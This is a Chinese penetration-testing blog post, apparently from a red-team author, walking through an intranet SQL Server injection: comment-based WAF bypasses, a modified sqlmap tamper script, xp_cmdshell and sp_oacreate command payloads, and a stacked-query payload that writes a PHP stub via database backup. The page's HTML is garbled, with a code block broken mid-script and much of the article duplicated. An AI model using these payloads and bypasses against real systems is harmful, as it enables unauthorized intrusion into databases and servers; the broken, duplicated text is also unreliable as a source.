<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>SQL Server DBA WriteFile « 倾旋的博客</title>
  <meta name="description" content="0x01 前言本文非基础类的普及文章，主要分享内网中遇到的一个有趣案例。0x02 Bypass注入点通常情况下，遇到SQL Server注入点，我会比较关注是否是DBA权限，如果是，那么就可能拿到执行命令的权限，进而反弹到Ｃ2上，方便后续的后渗透工作。一开始在一处比较复杂的功能点发现了SQL Server的注入，...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2020-01-01/3">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">SQL Server DBA WriteFile</h1>
    <p class="post-meta">Jan 1, 2020</p>
  </header>

  <article class="post-content">
    <h2 id="0x01-前言">0x01 前言</h2>

<p>本文非基础类的普及文章，主要分享内网中遇到的一个有趣案例。</p>

<h2 id="0x02-bypass注入点">0x02 Bypass注入点</h2>

<p>通常情况下，遇到SQL Server注入点，我会比较关注是否是DBA权限，如果是，那么就可能拿到执行命令的权限，进而反弹到Ｃ2上，方便后续的后渗透工作。</p>

<p>一开始在一处比较复杂的功能点发现了SQL Server的注入，也是首先利用AND进行判断：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ff14d4d92d1d2c87226c80bf934d541f.png" alt="2020-01-03-13-13-15"></p>

<p>参数：ModuleType存在注入点，但是后面有一层站点全局输入的检测机制，从简单的测试来看，是不存在语法分析的一种，比较容易绕过。</p>

<p>我尝试了以下方案：</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">and -&gt; And</code></li>
  <li><code class="language-plaintext highlighter-rouge">and -&gt; /**/And</code></li>
  <li><code class="language-plaintext highlighter-rouge">and -&gt; /*xsww!s*/And</code></li>
  <li><code class="language-plaintext highlighter-rouge">and -&gt; /*xswwS1154-_[0)}!s*/And</code></li>
  <li><code class="language-plaintext highlighter-rouge">and -&gt; /***/And</code></li>
</ol>

<p>最终发现第五种可以绕过，使得后端无法辨别<code class="language-plaintext highlighter-rouge">/***/</code>是否和And是一个本体。</p>

<p>那么我猜想到了一个简单的表达式，似乎和这个过滤规则比较相向：<code class="language-plaintext highlighter-rouge">/*\w{0,}*/</code></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6698199e49414f5cdf5e0cb74725decb.png" alt="2020-01-03-13-13-28"></p>

<h2 id="0x03-tamper-自动化实现">0x03 tamper 自动化实现</h2>

<p>这里我比较懒，直接改了以下space2comment.py，这个脚本在Kali Linux中的sqlmap目录下：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b5b958529f18b8b570f16eca2cd1ac03.png" alt="2020-01-03-13-13-37"></p>

<p>核心代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">isspace</span><span class="p">():</span>
                    <span class="n">firstspace</span> <span class="o">=</span> <span class="bp">True</span>
                    <span class="n">retVal</span> <span class="o">+=</span> <span class="s">"/**/"</span>
                    <span class="k">continue</span>

            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'

只需要替换`/**/`即可：

![2020-01-03-13-13-49](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/cb7b577625d7a6106e39687558cdc6c7.png)

接着，就可以跑出注入了\~

PS：我比较习惯于添加`--random-agent`参数，理由是在注入的过程中，避免被流量感知设备发现。

![2020-01-03-13-14-00](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1ea40c2f77061bc94c939aaf8a1c01a5.png)

## 0x04 xp_cmdshell

到这一步的时候，我遇到了一个问题，SQLMAP调用exec master..xp_cmshell的时候被拦截了，因为后端还检测是否有`exec`、`master`，于是我还要将tamper加两句：

</span></code></pre></div></div>
<p>payload = payload.replace(“exec”,”/<strong><em>/Execute/</em></strong>/”)
payload = payload.replace(“master..”,”/<strong><em>//</em></strong>/”)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
最终结果：`/***/execute/***//***/xp_cmdshell/***/'whoami'`

点击发包，还是无法执行，被360拦截了！

![2020-01-03-13-14-22](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fc6bd35eb07d11206d2bcf9ccb701553.png)

这个Error Code 5 ，是Windows的错误代码，中文意思就是：“拒绝访问”。

现在xp_cmdshell被拦截的很多了，但是sp_oacreate应该可以使用的：


参考我之前写的一篇文章：[Regsvr32 ole对象](https://payloads.online/archivers/2019-07-19/1)


</code></pre></div></div>
<p>declare @shell int exec sp_oacreate ‘wscript.shell’,@shell output exec sp_oamethod @shell,’run’,null,’c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt’</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
&gt; 后续我发现该服务器无法出网，还是站库分离

**因此无法执行操作系统命令**

## 0x05 写入文件

在写文件这块，我浪费了大量的时间，首先要确定能否向站点目录写文件，当前写文件的操作是否被拦截等等因素。

一开始的思路是调用xp_cmdshell，采用echo去写，目前已无法执行命令，就此作罢，吸了一口芙蓉王，精神焕发，遂查到数据库备份的方式。

提交：

</code></pre></div></div>
<p>{“ClientType”: “”, “ClientGuid”: “09a37ee1-5ec3-46db-9279-4cb066622e8d”, “ModuleType”: “A2501’;use test222;create table [dbo].[test2] ([cmd] [image]);insert/<strong><em>/into/</em></strong>/test2(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);backup database test222 to disk=’C:\test2.bak’ WITH DIFFERENTIAL,FORMAT;– “, “IsBackEnd”: false }</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
页面返回正常。

但是，我的站点目录如果是中文呢？在Burp里处理就非常麻烦！

还记得之前的IIS 7.5吗，**IIS在接收到一个请求后，会自动将数据进行Unicode解码，如果流量设备、WAF不支持此特性的话，就可以进行绕过**，这里我着重解决中文目录的问题。

![2020-01-03-13-14-38](https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/259de32b7fe3faac8fa6bff186660e07.png)

到这此文就结束了，我并没有成功Getshell，只是回顾我解决问题的思维方式，希望能对大家有用！

':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue
</code></pre></div></div>

<p>只需要替换<code class="language-plaintext highlighter-rouge">/**/</code>即可：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/cb7b577625d7a6106e39687558cdc6c7.png" alt="2020-01-03-13-13-49"></p>

<p>接着，就可以跑出注入了~</p>

<p>PS：我比较习惯于添加<code class="language-plaintext highlighter-rouge">--random-agent</code>参数，理由是在注入的过程中，避免被流量感知设备发现。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1ea40c2f77061bc94c939aaf8a1c01a5.png" alt="2020-01-03-13-14-00"></p>

<h2 id="0x04-xp_cmdshell">0x04 xp_cmdshell</h2>

<p>到这一步的时候，我遇到了一个问题，SQLMAP调用exec master..xp_cmshell的时候被拦截了，因为后端还检测是否有<code class="language-plaintext highlighter-rouge">exec</code>、<code class="language-plaintext highlighter-rouge">master</code>，于是我还要将tamper加两句：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload = payload.replace("exec","/***/Execute/***/")
payload = payload.replace("master..","/***//***/")
</code></pre></div></div>

<p>最终结果：<code class="language-plaintext highlighter-rouge">/***/execute/***//***/xp_cmdshell/***/'whoami'</code></p>

<p>点击发包，还是无法执行，被360拦截了！</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/fc6bd35eb07d11206d2bcf9ccb701553.png" alt="2020-01-03-13-14-22"></p>

<p>这个Error Code 5 ，是Windows的错误代码，中文意思就是：“拒绝访问”。</p>

<p>现在xp_cmdshell被拦截的很多了，但是sp_oacreate应该可以使用的：</p>

<p>参考我之前写的一篇文章：<a href="https://payloads.online/archivers/2019-07-19/1">Regsvr32 ole对象</a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami &gt;C:\who.txt'
</code></pre></div></div>

<blockquote>
  <p>后续我发现该服务器无法出网，还是站库分离</p>
</blockquote>

<p><strong>因此无法执行操作系统命令</strong></p>

<h2 id="0x05-写入文件">0x05 写入文件</h2>

<p>在写文件这块，我浪费了大量的时间，首先要确定能否向站点目录写文件，当前写文件的操作是否被拦截等等因素。</p>

<p>一开始的思路是调用xp_cmdshell，采用echo去写，目前已无法执行命令，就此作罢，吸了一口芙蓉王，精神焕发，遂查到数据库备份的方式。</p>

<p>提交：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"ClientType": "", "ClientGuid": "09a37ee1-5ec3-46db-9279-4cb066622e8d", "ModuleType": "A2501';use test222;create table [dbo].[test2] ([cmd] [image]);insert/***/into/***/test2(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);backup database test222 to disk='C:\test2.bak' WITH DIFFERENTIAL,FORMAT;-- ", "IsBackEnd": false }
</code></pre></div></div>

<p>页面返回正常。</p>

<p>但是，我的站点目录如果是中文呢？在Burp里处理就非常麻烦！</p>

<p>还记得之前的IIS 7.5吗，<strong>IIS在接收到一个请求后，会自动将数据进行Unicode解码，如果流量设备、WAF不支持此特性的话，就可以进行绕过</strong>，这里我着重解决中文目录的问题。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/259de32b7fe3faac8fa6bff186660e07.png" alt="2020-01-03-13-14-38"></p>

<p>到这此文就结束了，我并没有成功Getshell，只是回顾我解决问题的思维方式，希望能对大家有用！</p>


  </article>
  
  




</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
